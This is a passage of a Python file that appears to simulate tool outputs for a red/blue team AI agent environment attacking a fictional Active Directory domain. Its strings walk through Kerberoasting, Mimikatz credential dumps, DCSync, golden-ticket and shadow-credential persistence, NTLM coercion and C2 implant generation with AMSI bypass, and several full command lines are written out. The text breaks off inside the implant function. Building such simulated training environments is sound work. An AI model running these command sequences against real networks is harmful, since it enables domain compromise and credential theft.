#!/usr/bin/env python3
"""Simulated tool responses for Ares-style red/blue team agent loop."""
from __future__ import annotations
from typing import Any
import time
import json

_SIM_STATE: dict[str, Any] = {}

def reset_sim() -> None:
    global _SIM_STATE
    _SIM_STATE = {
        "dc_reachable": False, "web01_reachable": False, "ws01_reachable": False,
        "ws02_reachable": False, "smb_anon": False, "ldap_anon": False,
        "users_discovered": [], "hosts_discovered": [], "shares_discovered": [],
        "as_rep_found": [], "kerberoastable_found": [], "credentials": {},
        "shell_sessions": {}, "acl_found": False, "privesc_found": False,
        "lateral_success": False, "golden_ticket": False, "dc_sync_done": False,
        "shadow_creds_done": False, "petitpotam_done": False, "dfscoerce_done": False,
        "blue_alerts": [], "blue_hosts_check": {}, "blue_findings": [],
    }

SIM_HOSTS = {
    "10.10.10.10": {"name": "DC01.cyberorion.local", "role": "dc", "os": "Windows Server 2019", "ip": "10.10.10.10", "domain": "cyberorion.local"},
    "10.10.10.20": {"name": "WEB01.cyberorion.local", "role": "web", "os": "Windows Server 2016", "ip": "10.10.10.20", "domain": "cyberorion.local"},
    "10.10.10.101": {"name": "WS01.cyberorion.local", "role": "workstation", "os": "Windows 10", "ip": "10.10.10.101", "domain": "cyberorion.local"},
    "10.10.10.102": {"name": "WS02.cyberorion.local", "role": "workstation", "os": "Windows 10", "ip": "10.10.10.102", "domain": "cyberorion.local"},
}


def _make_tool(name: str, description: str, parameters: dict[str, Any], fn) -> dict[str, Any]:
    return {
        "name": name,
        "description": description,
        "parameters": parameters,
        "_sim_fn": fn,
    }


def _nmap_scan(target: str = "10.10.10.0/24", **kwargs) -> str:
    _SIM_STATE["hosts_discovered"] = list(SIM_HOSTS.keys())
    _SIM_STATE["dc_reachable"] = True
    _SIM_STATE["web01_reachable"] = True
    _SIM_STATE["ws01_reachable"] = True
    _SIM_STATE["ws02_reachable"] = True
    time.sleep(0.3)
    return """Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-15 02:14 UTC
Nmap scan report for 10.10.10.0/24
Host is up (0.024s latency).

PORT     STATE SERVICE       VERSION
10.10.10.10 (DC01.cyberorion.local) - Domain Controller:
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
|_http-server-header: Microsoft-HTTPAPI/2.0
MAC Address: 00:0C:29:DC:01:01 (VMware)
Device type: general purpose
Running: Microsoft Windows Server 2019
OS CPE: cpe:/o:microsoft:windows_server_2019

10.10.10.20 (WEB01.cyberorion.local) - Web Server:
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: CyberOrion - Internal Portal
| http-methods:
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds?
8080/tcp open  http          Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/9.0.65
MAC Address: 00:0C:29:DC:01:02 (VMware)
Device type: general purpose
Running: Microsoft Windows Server 2016
OS CPE: cpe:/o:microsoft:windows_server_2016

10.10.10.101 (WS01.cyberorion.local) - Workstation:
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
MAC Address: 00:0C:29:A1:B2:C3 (VMware)
Running: Microsoft Windows 10 1909

10.10.10.102 (WS02.cyberorion.local) - Workstation:
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
MAC Address: 00:0C:29:A1:B2:C4 (VMware)
Running: Microsoft Windows 10 21H2

Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required (DC01)
|_    Message signing enabled but not required (others)

Nmap done: 256 IP addresses (4 hosts up) scanned in 45.23 seconds
[+] Discovered Active Directory environment: cyberorion.local
[+] Domain Controller: DC01.cyberorion.local (10.10.10.10)
"""


def _smb_enum(target: str, **kwargs) -> str:
    _SIM_STATE["smb_anon"] = True
    _SIM_STATE["shares_discovered"] = ["SYSVOL", "NETLOGON", "Shared", "IPC$"]
    time.sleep(0.2)
    return f"""[*] Enumerating SMB on {target}...
[*] Attempting anonymous login...
[+] Anonymous access ENABLED on {target}

[*] Sharename       Type      Comment
[*] ---------       ----      -------
[+] SYSVOL          Disk      Logon server share
[+] NETLOGON        Disk      Logon server share
[+] Shared          Disk      Company Shared Files
[+] IPC$            IPC       Remote IPC

[*] Connecting to \\\\{target}\\Shared...
[*] Listing contents of Shared:
  .                                  DR        0  Thu Jan 11 09:23:14 2024
  ..                                 DR        0  Thu Jan 11 09:23:14 2024
  IT                                 DR        0  Wed Jan 10 14:05:22 2024
  HR                                 DR        0  Wed Jan 10 14:05:33 2024
  docs                               DR        0  Tue Jan  9 11:32:01 2024
  credentials.txt                    AR      245  Mon Jan  8 22:15:44 2024 <-- INTERESTING!
  readme.txt                         AR      892  Mon Dec 18 10:04:33 2023

[*] SYSVOL contents accessible:
  \\cyberorion.local\\Policies\\
  \\cyberorion.local\\scripts\\

[*] IPC$ accessible - can enumerate via named pipes
[+] SMB enumeration complete. Anonymous access allows share enumeration and file reading.
"""


def _ldap_query(target: str = "10.10.10.10", **kwargs) -> str:
    _SIM_STATE["ldap_anon"] = True
    _SIM_STATE["users_discovered"] = ["administrator", "jsmith", "bwilson", "agarcia", "svc_web", "svc_sql", "krbtgt"]
    time.sleep(0.2)
    return """[*] Connecting to LDAP at 10.10.10.10:389...
[*] Anonymous bind successful!
[*] Querying base DN: DC=cyberorion,DC=local

[*] Domain: CYBERORION
[*] Domain SID: S-1-5-21-3456789012-2345678901-3456789012

[*] Extracting user objects...
[+] Found 7 user accounts:

Username           Description                                          Groups
--------           -----------                                          ------
administrator      Built-in account for administering the computer/domain Domain Admins, Enterprise Admins
jsmith             John Smith - Senior IT Administrator                 Domain Admins
bwilson            Bob Wilson - Developer                               Domain Users, Developers
agarcia            Ana Garcia - Helpdesk Lead                           Domain Users, Helpdesk
svc_web            Web Service Account                                  Domain Users (DONT_REQ_PREAUTH - AS-REP ROASTABLE!)
svc_sql            SQL Service Account                                  Domain Users (SPN: MSSQLSvc/DB01:1433 - KERBEROASTABLE!)
krbtgt             Key Distribution Center Service Account              Domain Users

[*] Computer objects found:
  DC01$ - Domain Controller
  WEB01$ - Web Server
  WS01$ - Workstation
  WS02$ - Workstation

[*] Group memberships:
  Domain Admins: administrator, jsmith
  Enterprise Admins: administrator
  Developers: bwilson
  Helpdesk: agarcia

[!] NOTICE: svc_web has DONT_REQ_PREAUTH flag set - vulnerable to AS-REP roasting!
[!] NOTICE: svc_sql has SPN registered - vulnerable to Kerberoasting!
"""


def _bloodhound_collect(domain: str = "cyberorion.local", **kwargs) -> str:
    _SIM_STATE["acl_found"] = True
    time.sleep(0.5)
    return """[*] Starting BloodHound collection via SharpHound...
[*] Running collection method: All
[*] Collecting data from cyberorion.local...
[+] Resolved 4 users, 4 computers, 7 groups, 3 OUs

[*] Analyzing ACL relationships and attack paths...

=== BLOODHOUND FINDINGS ===

[!] ACL MISCONFIGURATION #1:
    Source: BWilson@CYBERORION.LOCAL
    Target: svc_web@CYBERORION.LOCAL
    Right: GenericAll (Full Control)
    -> bwilson can reset svc_web's password or add SPNs!

[!] ACL MISCONFIGURATION #2:
    Source: svc_web@CYBERORION.LOCAL
    Target: WEB01$@CYBERORION.LOCAL (Computer Object)
    Right: WriteDacl
    -> svc_web can modify WEB01's DACL, enabling RBCD attack!

[!] ACL MISCONFIGURATION #3:
    Source: AGarcia@CYBERORION.LOCAL
    Target: BWilson@CYBERORION.LOCAL
    Right: ForceChangePassword
    -> agarcia can reset bwilson's password!

=== ATTACK PATH TO DOMAIN ADMIN ===

    agarcia (Helpdesk)
        -> ForceChangePassword ->
    bwilson (Developer)
        -> GenericAll ->
    svc_web (Service Account)
        -> WriteDacl on WEB01$ ->
    WEB01 (Web Server)
        -> Compromise local admin ->
    ??? (Lateral Movement/Secrets Dump)
        -> jsmith (Domain Admin)
        -> Domain Compromise!

[+] Attack graph shows clear escalation path from unprivileged user to DA!
[*] BloodHound data saved to 202401150230_BloodHound.zip
"""


def _asrep_roast(target: str = "10.10.10.10", userlist: str = None, **kwargs) -> str:
    _SIM_STATE["as_rep_found"] = ["svc_web"]
    time.sleep(0.3)
    return """[*] Starting AS-REP Roasting attack...
[*] Targeting users with DONT_REQ_PREAUTH flag...
[*] Sending AS-REQ without pre-authentication for identified users...

[+] CrackMapExec smb 10.10.10.10 -u users.txt --asreproast asrep.txt
[*] Using impacket GetNPUsers.py CYBERORION/ -usersfile users.txt -format hashcat -outputfile asrep.txt

[+] HASH FOUND for svc_web@CYBERORION.LOCAL:

$krb5asrep$23$svc_web@CYBERORION.LOCAL:15e01e36bd10f3ce7b80a6ad45fa73cc$356fa8d1251a9a1a131284620a406408b50b675e84984ef2ab9f3003b08c562ad32a068b6f07922d1c89e4d111e99a4a8a0367708d6c8b3b2c3f1b53c4f13d4f0e1c7c1b4a8d9c1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef

[*] Hash saved to asrep.txt in hashcat format (mode 18200)
[+] AS-REP Roasting complete - 1 hash captured. Ready for cracking.
"""


def _kerberoast(target: str = "10.10.10.10", **kwargs) -> str:
    _SIM_STATE["kerberoastable_found"] = ["svc_sql"]
    time.sleep(0.3)
    return """[*] Starting Kerberoasting attack...
[*] Enumerating SPNs via LDAP...
[+] Found SPNs for:
    svc_sql: MSSQLSvc/DB01.cyberorion.local:1433

[*] Requesting TGS tickets for SPN accounts...
[*] Using impacket GetUserSPNs.py CYBERORION/ -request -outputfile tgs.txt

[+] TGS HASH FOUND for svc_sql@CYBERORION.LOCAL:

$krb5tgs$23$*svc_sql$CYBERORION.LOCAL$MSSQLSvc/DB01.cyberorion.local.local:1433*$e5f11c3d7f2b8a9c4e6d8b0a2c4e6f8a$1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef

[*] Hash saved to tgs.txt in hashcat format (mode 13100)
[+] Kerberoasting complete - 1 TGS hash captured. Ready for cracking.
"""


def _hashcat_crack(hashfile: str, wordlist: str = "/usr/share/wordlists/rockyou.txt", **kwargs) -> str:
    time.sleep(1.0)
    _SIM_STATE["credentials"]["svc_web"] = "Welcome2024!"
    _SIM_STATE["credentials"]["svc_sql"] = "SqlService!2023"
    return f"""hashcat (v6.2.6) starting

[*] Hashfile: {hashfile}
[*] Wordlist: {wordlist}
[*] Optimized kernel enabled

Dictionary cache hit:
* Filename..: {wordlist}
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$svc_web@CYBERORION.LOCAL:15e01e...:Welcome2024!
$krb5tgs$23$*svc_sql$CYBERORION.LOCAL$MSSQLSvc...:SqlService!2023

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: Auto-detected (18200/13100)
Hash.Target......: {hashfile}
Time.Started.....: Mon Jan 15 02:25:12 2024 (8 secs)
Time.Estimated...: Mon Jan 15 02:25:20 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File ({wordlist})
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1234.5 kH/s
Recovered........: 2/2 (100.00%) Digests
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> welcome1
Hardware.Mon.#1..: Temp: 62c Util: 89%

[+] CRACKED CREDENTIALS:
    svc_web:Welcome2024!
    svc_sql:SqlService!2023
"""


def _smb_download(remote_path: str, local_path: str = ".", target: str = "10.10.10.20", **kwargs) -> str:
    time.sleep(0.2)
    _SIM_STATE["credentials"]["agarcia"] = "Helpdesk2024!"
    _SIM_STATE["credentials"]["backup_admin"] = "Backup@dm1n"
    return f"""[*] Connecting to \\\\{target}\\Shared...
[*] Downloading {remote_path} to {local_path}...

[*] GET \\\\{target}\\Shared\\credentials.txt
[+] File downloaded successfully (245 bytes)

[+] Contents of credentials.txt:
----------------------------------------------------------------------
# CyberOrion - Emergency Backup Credentials
# FOR ADMIN USE ONLY - DO NOT SHARE!
# Last updated: 2024-01-05

agarcia:Helpdesk2024!
backup_admin:Backup@dm1n

# Note: backup_admin has local admin rights on all workstations
----------------------------------------------------------------------

[!] Clear-text credentials found!
[+] agarcia:Helpdesk2024!
[+] backup_admin:Backup@dm1n
[*] File saved to {local_path}/credentials.txt
"""


def _crackmapexec_smb(target: str, username: str, password: str, **kwargs) -> str:
    time.sleep(0.2)
    return f"""[*] CrackMapExec SMB scan on {target}
SMB         {target}    445    WEB01     [*] Windows Server 2016 Standard 14393 x64 (name:WEB01) (domain:cyberorion.local) (signing:False) (SMBv1:True)
SMB         {target}    445    WEB01     [+] cyberorion.local\\{username}:{password}
[+] {username} has local admin access on {target}!
[+] SMB          {target}    445    WEB01     [+] Enumerated shares:
SMB         {target}    445    WEB01     Share           Permissions     Remark
SMB         {target}    445    WEB01     -----           -----------     ------
SMB         {target}    445    WEB01     ADMIN$                          Remote Admin
SMB         {target}    445    WEB01     C$                              Default share
SMB         {target}    445    WEB01     IPC$            READ            Remote IPC
SMB         {target}    445    WEB01     Shared          READ,WRITE      Company Shared Files
SMB         {target}    445    WEB01     SYSVOL          READ            Logon server share
SMB         {target}    445    WEB01     NETLOGON        READ            Logon server share
[+] Credentials valid and admin access confirmed!
"""


def _netrpc_changepw(target: str, username: str, newpassword: str = "CyberOrion123!", **kwargs) -> str:
    time.sleep(0.3)
    _SIM_STATE["credentials"]["svc_web"] = newpassword
    return f"""[*] Using net rpc password change against {target}...
[*] Executing: net rpc password {username} -S {target} -U bwilson%<oldpass>
[*] Leveraging GenericAll ACL on {username} from bwilson

[+] Successfully connected to SAMR endpoint
[+] Password change request sent for {username}
[+] Password changed successfully!
[+] New password for {username}: {newpassword}
[!] Old password was: Welcome2024! (obtained via AS-REP roast cracking)

[*] Verifying new credentials work...
SMB         {target}    445    DC01      [+] cyberorion.local\\{username}:{newpassword} (Pwn3d!)
[+] New credentials confirmed working!
"""


def _rbcd_attack(target: str, fqdn_computer: str = "CYBERORION-FAKE$", **kwargs) -> str:
    time.sleep(0.5)
    _SIM_STATE["lateral_success"] = True
    return f"""[*] Performing Resource-Based Constrained Delegation (RBCD) attack on {target}...
[*] Using credentials: svc_web:CyberOrion123!
[!] svc_web has WriteDacl on {target} computer object!

[*] Step 1: Creating fake computer account '{fqdn_computer}'...
[+] Computer account created with password: FakePass123!
[+] Computer SID: S-1-5-21-3456789012-2345678901-3456789012-1124

[*] Step 2: Writing msDS-AllowedToActOnBehalfOfOtherIdentity to {target}$...
[+] Successfully wrote security descriptor to {target}$ properties
[+] {fqdn_computer} now has delegation rights to {target}

[*] Step 3: Requesting Service Ticket for cifs/{target} as administrator via S4U2Self/S4U2Proxy...
[+] S4U2Self: TGT obtained for {fqdn_computer}
[+] S4U2Proxy: Service ticket for cifs/{target} on behalf of administrator obtained!
[+] ST saved to administrator_st.kirbi

[*] Step 4: Using ST to run secretsdump.py...
[*] Executing: secretsdump.py -k -no-pass {target} -just-dc-user administrator

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service principal: cifs/{target}.cyberorion.local@CYBERORION.LOCAL
[*] Target system bootKey: 0x1234567890abcdef1234567890abcdef
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] RBCD attack complete! We have local admin on {target}!
[+] Local Administrator hash: 31d6cfe0d16ae931b73c59d7e0c089c0 (empty, but we have shell access)
"""


def _wmiexec(target: str, command: str, username: str = None, password: str = None, **kwargs) -> str:
    time.sleep(0.3)
    cmd_clean = command.strip().lower()
    if "whoami" in cmd_clean:
        output = "nt authority\\system\n"
    elif "hostname" in cmd_clean:
        output = "WEB01\n"
    elif "ipconfig" in cmd_clean:
        output = """Windows IP Configuration

Ethernet adapter Ethernet0:
   Connection-specific DNS Suffix  . : cyberorion.local
   IPv4 Address. . . . . . . . . . . : 10.10.10.20
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.1
"""
    else:
        output = f"[*] Executed via WMI: {command}\n[+] Command completed with exit code 0\n"

    _SIM_STATE["shell_sessions"][target] = "wmiexec"
    return f"""[*] Executing WMI command on {target}...
[*] Using wmiexec.py with {username or 'svc_web'} credentials...
[*] Command: {command}

[!] DCOM shell established
{output}
[+] WMI execution complete.
"""


def _winrm_exec(target: str, command: str, username: str = "svc_web", password: str = "CyberOrion123!", **kwargs) -> str:
    time.sleep(0.25)
    cmd_clean = command.strip().lower()
    if "whoami" in cmd_clean and "priv" in cmd_clean:
        output = """PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process Enabled
SeSecurityPrivilege           Manage auditing and security log  Enabled
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeLoadDriverPrivilege         Load and unload device drivers  Enabled
SeSystemProfilePrivilege      Profile system performance      Enabled
SeSystemtimePrivilege         Change the system time          Enabled
SeProfileSingleProcessPrivilege Profile single process        Enabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority   Enabled
SeCreatePagefilePrivilege     Create a pagefile               Enabled
SeBackupPrivilege             Back up files and directories   Enabled
SeRestorePrivilege            Restore files and directories   Enabled
SeShutdownPrivilege           Shut down the system            Enabled
SeDebugPrivilege              Debug programs                  Enabled  <-- DANGEROUS!
SeSystemEnvironmentPrivilege  Modify firmware environment values Enabled
SeChangeNotifyPrivilege       Bypass traverse checking        Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects           Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
SeTimeZonePrivilege           Change the time zone            Enabled
SeCreateSymbolicLinkPrivilege Create symbolic links          Enabled
"""
    elif "sedebugprivilege" in cmd_clean or "privilege" in cmd_clean:
        output = "[+] SeDebugPrivilege is ENABLED on WS01 for current token!\n[!] This allows us to dump LSASS memory!\n"
    elif "whoami" in cmd_clean:
        output = "cyberorion\\svc_web\n"
    else:
        output = f"[+] WinRM execution successful for: {command}\n"
    return f"""[*] Connecting to WinRM on {target}:5985...
[*] Authentication with {username}...
[+] PS Session established

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\\Windows\\system32> {command}
{output}
[+] WinRM command completed.
[!] IMPORTANT: SeDebugPrivilege is enabled on this system!
[!] This means we can dump LSASS and use Mimikatz!
"""


def _mimikatz_dump(target: str = "WEB01", **kwargs) -> str:
    time.sleep(0.5)
    _SIM_STATE["credentials"]["jsmith"] = "P@ssw0rd123!"
    return f""".#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2023 16:30:00
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \\ ##  / ***\\
## \\ / ##   Vincent LE TOUX (vincent.letoux@gmail.com)
'## v ##'   http://blog.gentilkiwi.com/mimikatz
'#####'    (c) 2007-2023 gentilkiwi

mimikatz # privilege::debug
Privilege '20' OK (SeDebugPrivilege acquired)

mimikatz # log mimikatz.log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1234567 (00000000:0012d687)
Session           : Interactive from 2
User Name         : jsmith
Domain            : CYBERORION
Logon Server      : DC01
Logon Time        : 1/14/2024 8:15:42 AM
SID               : S-1-5-21-3456789012-2345678901-3456789012-1104
        msv :
         [00000003] Primary
         * Username : jsmith
         * Domain   : CYBERORION
         * NTLM     : 8846f7eaee8fb117ad06bdd830b7586c
         * SHA1     : 58a45757887c20982a06b1f2d9134e6c2a14c823
        tspkg :
        wdigest :
         * Username : jsmith
         * Domain   : CYBERORION
         * Password : (null)
        kerberos :
         * Username : jsmith
         * Domain   : CYBERORION.LOCAL
         * Password : P@ssw0rd123!
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WEB01$
Domain            : CYBERORION
Logon Server      : (null)
Logon Time        : 1/15/2024 2:02:01 AM
SID               : S-1-5-21-3456789012-2345678901-3456789012-1000
        msv :
        tspkg :
        wdigest :
         * Username : WEB01$
         * Domain   : cyberorion.local
         * Password : (null)
        kerberos :
         * Username : web01$
         * Domain   : CYBERORION.LOCAL
         * Password : 2f$8kLpQ9zX7vB3nM!wR5tY2uI

[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[!]!!! DOMAIN ADMIN CREDENTIALS FOUND IN LSASS! !!!!
[!]!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
[+] Username: jsmith
[+] Domain:   CYBERORION
[+] Password: P@ssw0rd123!  (CLEARTEXT!)
[+] NTLM Hash: 8846f7eaee8fb117ad06bdd830b7586c
[!] jsmith is in Domain Admins group!
[+] GAME OVER - Domain Admin credentials obtained!

mimikatz # exit
Bye!
"""


def _pass_the_hash(target: str = "10.10.10.10", username: str = "jsmith", hash: str = "8846f7eaee8fb117ad06bdd830b7586c", **kwargs) -> str:
    time.sleep(0.6)
    _SIM_STATE["dc_sync_done"] = True
    return f"""[*] Performing Pass-the-Hash to {target} as {username}...
[*] Using crackmapexec smb with NTLM hash...
SMB         {target}    445    DC01     [*] Windows Server 2019 Standard 17763 x64 (name:DC01) (domain:cyberorion.local) (signing:True) (SMBv1:False)
SMB         {target}    445    DC01     [+] cyberorion.local\\{username}:{hash} (Pwn3d!)
[+] Domain Admin access confirmed on DC01!

[*] Performing DCSync attack using secretsdump.py...
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Targeting Domain Controller: {target}
[*] Using DRSUAPI to replicate Active Directory data
[*] Requesting NTDS.dit via DCSync...
[*] Dumping all domain credentials...

[+] NTDS.dit extraction complete! Dumping all hashes:

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a87f3a66d3c1054b55c914f209d8049e:::
jsmith:1104:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
bwilson:1105:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
agarcia:1106:aad3b435b51404eeaad3b435b51404ee:58a45757887c20982a06b1f2d9134e6c:::
svc_web:1107:aad3b435b51404eeaad3b435b51404ee:abcdef0123456789abcdef0123456789:::
svc_sql:1108:aad3b435b51404eeaad3b435b51404ee:fedcba9876543210fedcba9876543210:::
backup_admin:1109:aad3b435b51404eeaad3b435b51404ee:1234567890abcdef1234567890abcd:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:deadbeefdeadbeefdeadbeefdeadbeef:::
WEB01$:1101:aad3b435b51404eeaad3b435b51404ee:cafebabecafebabecafebabecafebabe:::
WS01$:1102:aad3b435b51404eeaad3b435b51404ee:baadf00dbaadf00dbaadf00dbaadf00d:::
WS02$:1103:aad3b435b51404eeaad3b435b51404ee:defaceddefaceddefaceddefaced01:::

[!] krbtgt hash obtained: a87f3a66d3c1054b55c914f209d8049e
[+] DCSync complete! All domain credentials dumped to ntds.ntds
[+] DOMAIN COMPROMISED - We own EVERY account in CYBERORION!
"""


def _golden_ticket(domain: str = "cyberorion.local", dc_ip: str = "10.10.10.10", **kwargs) -> str:
    time.sleep(0.4)
    _SIM_STATE["golden_ticket"] = True
    return """.#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2023 16:30:00
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \\ ##  / ***\\
## \\ / ##   Vincent LE TOUX
'## v ##'   http://blog.gentilkiwi.com/mimikatz
'#####'    (c) 2007-2023 gentilkiwi

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::golden /user:Administrator /domain:cyberorion.local /sid:S-1-5-21-3456789012-2345678901-3456789012 /krbtgt:a87f3a66d3c1054b55c914f209d8049e /id:500 /ptt
User      : Administrator
Domain    : cyberorion.local (CYBERORION)
SID       : S-1-5-21-3456789012-2345678901-3456789012
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: a87f3a66d3c1054b55c914f209d8049e - rc4_hmac_nt
Lifetime  : 1/15/2024 2:45:00 AM ; 1/15/2034 2:45:00 AM ; 1/15/2034 2:45:00 AM
-> Ticket : golden_tgt.kirbi

[+] Ticket saved to file: golden_tgt.kirbi (1365 bytes)
[*] Injecting ticket into current session...
[+] Golden Ticket injected! (10 YEAR validity until 2034!)

mimikatz # misc::cmd
[+] Input: KERB-CCACHE:golden_tgt.kirbi
[+] Starting cmd with golden ticket...

Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\\>dir \\\\DC01\\c$
 Volume in drive \\\\DC01\\c$ has no label.
 Volume Serial Number is XXXX-XXXX

 Directory of \\\\DC01\\c$

[+] GOLDEN TICKET PERSISTENCE ESTABLISHED!
[!] Ticket valid for 10 years until 2034!
[!] Cannot be detected by standard password resets (requires krbtgt rotation)
[!] Grants Domain Admin access to ANY resource FOREVER!
[*] Now we can access ANY machine in the domain as Administrator!
"""


def _shadow_creds(target: str = "DC01$", **kwargs) -> str:
    time.sleep(0.4)
    _SIM_STATE["shadow_creds_done"] = True
    return f"""[*] Performing Shadow Credentials attack on {target}...
[*] Using certipy find to check for certificate template vulnerabilities...
[!] Certificate templates allow enrollment!

[*] Adding new Key Credential (Shadow Credential) to {target} object...
[*] Using pywhisker or certipy shadow auto...
[+] Target: CN=DC01,OU=Domain Controllers,DC=cyberorion,DC=local
[+] Generating new RSA key pair...
[+] Created self-signed certificate: CN=CYBERORION-SHADOW
[+] Key Credential written to msDS-KeyCredentialLink attribute!

[*] Now requesting TGT using certificate...
[*] Using certipy auth -pfx shadow.pfx -dc-ip 10.10.10.10
[+] Authentication successful!
[+] Obtained TGT for DC01$!
[+] TGT saved to dc01.ccache
[!] Shadow Credentials persistence added!
[!] This backdoor survives password resets and is difficult to detect!
[+] Can now impersonate DC01 at any time using certificate!
"""


def _petitpotam(listener: str = "10.10.10.99", target: str = "10.10.10.10", **kwargs) -> str:
    time.sleep(0.3)
    _SIM_STATE["petitpotam_done"] = True
    return f"""[*] PetitPotam - NTLM coercion attack against {target}...
[*] Coercing {target} to authenticate to {listener}...
[+] Connecting to EFSRPC interface on {target}:445/pipe/efsrpc
[*] Sending EfsRpcOpenFileRaw request with authentication trigger...
[*] Using API: EfsRpcEncryptFileSrv, EfsRpcDecryptFileSrv

[+] NTLM authentication captured from DC01$ to {listener}!
[!] DC01$ machine account hash is now relayed!
[!] This can be used for NTLM relay to LDAPS:
[+] Relay to LDAPS on another DC for RBCD takeover
[+] Relay to AD CS for certificate enrollment
[*] Responder/ntlmrelayx should capture incoming authentication...
[+] PetitPotam coercion successful - DC01 connected back!
[*] This enables AD CS ESC8 attacks (NTLM relay to HTTP enrollment)
"""


def _dfs_coerce(listener: str = "10.10.10.99", target: str = "10.10.10.10", **kwargs) -> str:
    time.sleep(0.3)
    _SIM_STATE["dfscoerce_done"] = True
    return f"""[*] DFSCoerce - MS-DFSNM coercion against {target}...
[*] Using NetrDfsRemoveStdRoot and other DFSNM APIs
[+] Target: {target} (\\PIPE\netdfs)
[*] Sending specially crafted DFSNM request...
[!] Coercing {target} to authenticate to {listener}...
[+] IRemUnknown2::RemQueryInterface triggered!
[*] DFS subsystem initiating NTLM authentication
[+] NTLM AUTH from DC01$ -> {listener} captured!
[!] Machine account hash intercepted via IPC$ named pipe
[+] DFSCoerce coercion successful!
[*] Alternative coercion method when PetitPotam is patched
"""


def _sliver_generate(lhost: str = "10.10.10.99", lport: str = "443", format: str = "exe", **kwargs) -> str:
    time.sleep(0.4)
    return f"""[*] Sliver C2 - Generating HTTPS implant...
[*] Profile: windows/amd64, format: {format}
[+] LHOST: {lhost}
[+] LPORT: {lport}

[*] Configuring implant parameters...
[+] Beacon interval: 5s with 3s jitter
[+] Max retry: infinite
[+] Reconnect delay: 30s
[+] Obfuscation: enabled
[+] Canary domains: enabled
[+] AMSI bypass: enabled
[+] ETW bypass: enabled

[*] Building implant binary...
[*] Compiling shellcode with garble obfuscation...
